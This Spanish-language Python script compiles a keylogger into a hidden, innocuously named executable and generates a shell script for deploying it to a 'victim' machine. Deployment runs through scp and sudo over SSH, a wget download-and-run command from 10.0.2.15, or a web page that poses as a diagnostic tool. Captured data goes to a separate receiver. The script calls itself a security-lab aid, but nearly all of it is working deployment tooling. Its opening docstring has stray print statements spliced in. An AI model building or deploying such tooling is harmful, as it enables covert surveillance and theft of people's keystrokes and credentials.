#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔧 COMPILADOR DE EJECUTABLE - KEYLOGGER EMPRESARIAL
==================================================
Convierte el keylogger en un ejecutable autónomo para
facilitar el despliegue en máquinas víctima.

    print("🎉 ¡COMPILACIÓN COMPLETADA!")
    print("=" * 50)
    print("📦 Ejecutable creado: dist/system_monitor")
    print("🚀 Script de despliegue: deploy_keylogger.sh")
    print("🌐 Interfaz web: index.html")
    print()
    print("📋 PRÓXIMOS PASOS:")
    print("1. ./deploy_keylogger.sh    (guía interactiva)")
    print("2. python3 -m http.server 8000    (interfaz web)")
    print("3. Abrir http://10.0.2.15:8000 en víctima")
    print()
    print("🎯 Para recibir datos:")
    print("python3 data_receiver.py --port 8080")- Ejecutable standalone sin dependencias
- Incluye todas las librerías necesarias
- Funciona sin Python instalado
- Perfecto para laboratorios de seguridad

USO:
1. python3 build_keylogger.py
2. Copiar dist/system_monitor a máquina víctima
3. En víctima: chmod +x system_monitor && sudo ./system_monitor
"""

import subprocess
import sys
import os
import shutil

def check_requirements():
    """Verificar archivos necesarios"""
    required_files = ["system_monitor.py", "reconstructor.py"]
    missing = []
    
    for file in required_files:
        if not os.path.exists(file):
            missing.append(file)
    
    if missing:
        print("❌ Archivos requeridos no encontrados:")
        for file in missing:
            print(f"   - {file}")
        return False
    
    print("✅ Todos los archivos requeridos encontrados")
    return True

def install_pyinstaller():
    """Instalar PyInstaller"""
    try:
        import PyInstaller
        print("✅ PyInstaller ya está instalado")
        return True
    except ImportError:
        pass
    
    print("📦 Instalando PyInstaller...")
    
    # Método 1: pip install con --break-system-packages (para sistemas modernos)
    try:
        subprocess.run([
            sys.executable, "-m", "pip", "install", "pyinstaller", "--break-system-packages"
        ], check=True, capture_output=True)
        print("✅ PyInstaller instalado")
        return True
    except subprocess.CalledProcessError:
        pass
    
    # Método 2: pip install normal
    try:
        subprocess.run([
            sys.executable, "-m", "pip", "install", "pyinstaller"
        ], check=True, capture_output=True)
        print("✅ PyInstaller instalado")
        return True
    except subprocess.CalledProcessError:
        pass
    
    # Método 3: apt install (Ubuntu/Debian)
    try:
        subprocess.run([
            "sudo", "apt", "install", "-y", "python3-pyinstaller"
        ], check=True, capture_output=True)
        print("✅ PyInstaller instalado via apt")
        return True
    except subprocess.CalledProcessError:
        pass
    
    print("❌ No se pudo instalar PyInstaller")
    print("💡 Intenta manualmente:")
    print("   sudo apt install python3-pyinstaller")
    print("   o")
    print("   pip install pyinstaller --break-system-packages")
    return False

def build_executable():
    """Compilar keylogger en ejecutable standalone"""
    print("🔧 Compilando system_monitor.py en ejecutable...")
    
    # Limpiar compilaciones anteriores
    if os.path.exists("dist"):
        shutil.rmtree("dist")
    if os.path.exists("build"):
        shutil.rmtree("build")
    for spec_file in ["system_monitor.spec", "keylogger.spec"]:
        if os.path.exists(spec_file):
            os.remove(spec_file)
    
    # Comando de compilación
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",                      # Un solo archivo
        "--name=system_monitor",          # Nombre del ejecutable
        "--add-data=reconstructor.py:.", # Incluir reconstructor.py
        "--hidden-import=pynput",         # Importaciones requeridas
        "--hidden-import=requests",
        "--hidden-import=base64",
        "--hidden-import=hashlib",
        "--hidden-import=threading",
        "--hidden-import=time",
        "--hidden-import=os",
        "--hidden-import=json",
        "--noconsole",                    # Sin ventana de consola
        "--clean",                        # Limpiar cache
        "system_monitor.py"               # Archivo principal
    ]
    
    try:
        print("💻 Ejecutando PyInstaller...")
        print(f"📄 Comando: {' '.join(cmd)}")
        
        result = subprocess.run(cmd, check=True, capture_output=True, text=True)
        
        # Verificar que se creó el ejecutable
        executable_path = "dist/system_monitor"
        if os.path.exists(executable_path):
            # Hacer ejecutable
            os.chmod(executable_path, 0o755)
            
            # Obtener información del archivo
            size = os.path.getsize(executable_path)
            size_mb = size / (1024 * 1024)
            
            print("✅ ¡Compilación exitosa!")
            print(f"📂 Ejecutable: {executable_path}")
            print(f"📏 Tamaño: {size_mb:.1f} MB")
            print(f"🔧 Permisos: ejecutable")
            
            return True
        else:
            print("❌ Error: ejecutable no encontrado después de compilación")
            return False
            
    except subprocess.CalledProcessError as e:
        print("❌ Error en compilación:")
        print(f"   Código de salida: {e.returncode}")
        if e.stdout:
            print(f"   STDOUT: {e.stdout}")
        if e.stderr:
            print(f"   STDERR: {e.stderr}")
        return False

def create_deployment_script():
    """Crear script para facilitar el despliegue"""
    script_content = '''#!/bin/bash
# Script de despliegue del keylogger empresarial
# Uso: ./deploy_keylogger.sh

echo "🚀 DESPLIEGUE DE KEYLOGGER EMPRESARIAL"
echo "====================================="

# Verificar ejecutable
if [ ! -f "dist/system_monitor" ]; then
    echo "❌ Error: ejecutable no encontrado"
    echo "   Ejecuta primero: python3 build_keylogger.py"
    exit 1
fi

echo "📂 Ejecutable encontrado: dist/system_monitor"

# Verificar permisos de ejecución
if [ ! -x "dist/system_monitor" ]; then
    echo "🔧 Configurando permisos de ejecución..."
    chmod +x dist/system_monitor
fi

# Información del ejecutable
SIZE=$(du -h dist/system_monitor | cut -f1)
echo "📏 Tamaño: $SIZE"

echo ""
echo "📋 OPCIONES DE DESPLIEGUE:"
echo "========================="
echo ""
echo "1. 🖥️  EJECUCIÓN LOCAL:"
echo "   sudo ./dist/system_monitor"
echo ""
echo "2. 📤 TRANSFERIR A VÍCTIMA:"
echo "   scp dist/system_monitor usuario@10.0.2.4:/tmp/"
echo "   ssh usuario@10.0.2.4 'chmod +x /tmp/system_monitor && sudo /tmp/system_monitor'"
echo ""
echo "3. 🌐 SERVIR VÍA HTTP CON INTERFAZ WEB:"
echo "   # En otra terminal:"
echo "   python3 -m http.server 8000"
echo "   # En víctima (navegador):"
echo "   http://10.0.2.15:8000 -> 'Iniciar Diagnóstico'"
echo "   # O en víctima (terminal):"
echo "   wget http://10.0.2.15:8000/dist/system_monitor && chmod +x system_monitor && sudo ./system_monitor"
echo ""
echo "4. 🏃 EJECUCIÓN RÁPIDA (si ya tienes acceso SSH):"

# Crear comando de ejecución rápida
read -p "¿Ejecutar en máquina víctima ahora? (IP: 10.0.2.4) [y/N]: " -n 1 -r
echo
if [[ $REPLY =~ ^[Yy]$ ]]; then
    echo "🚀 Transfiriendo y ejecutando..."
    
    # Transferir archivo
    scp dist/system_monitor usuario@10.0.2.4:/tmp/ && \\
    echo "✅ Archivo transferido" && \\
    
    # Ejecutar remotamente
    ssh usuario@10.0.2.4 'chmod +x /tmp/system_monitor && sudo /tmp/system_monitor &' && \\
    echo "✅ Keylogger iniciado en víctima"
else
    echo "ℹ️  Usa las opciones de arriba para desplegar manualmente"
fi

echo ""
echo "🎯 MONITOREO:"
echo "============"
echo "Para recibir datos, ejecuta en otra terminal:"
echo "python3 data_receiver.py --port 8080"
'''

    with open("deploy_keylogger.sh", "w") as f:
        f.write(script_content)
    
    os.chmod("deploy_keylogger.sh", 0o755)
    print("✅ Script de despliegue creado: deploy_keylogger.sh")

def main():
    """Función principal"""
    print("🔧 COMPILADOR DE KEYLOGGER EMPRESARIAL")
    print("=" * 50)
    print()
    
    # Verificar archivos necesarios
    if not check_requirements():
        return
    
    # Instalar PyInstaller
    if not install_pyinstaller():
        return
    
    # Compilar ejecutable
    if not build_executable():
        print("\n❌ COMPILACIÓN FALLIDA")
        print("💡 Soluciones alternativas:")
        print("   1. Usar auto_setup.sh (instalación automática)")
        print("   2. Copiar system_monitor.py directamente")
        return
    
    # Crear script de despliegue
    create_deployment_script()
    
    print("\n🎉 ¡COMPILACIÓN COMPLETADA!")
    print("=" * 50)
    print("📦 Ejecutable creado: dist/system_monitor")
    print("🚀 Script de despliegue: deploy_keylogger.sh")
    print()
    print("📋 PRÓXIMOS PASOS:")
    print("1. ./deploy_keylogger.sh    (guía interactiva)")
    print("2. sudo ./dist/system_monitor    (ejecución local)")
    print("3. Copiar dist/system_monitor a víctima")
    print()
    print("🎯 Para recibir datos:")
    print("python3 data_receiver.py --port 8080")

if __name__ == "__main__":
    main()
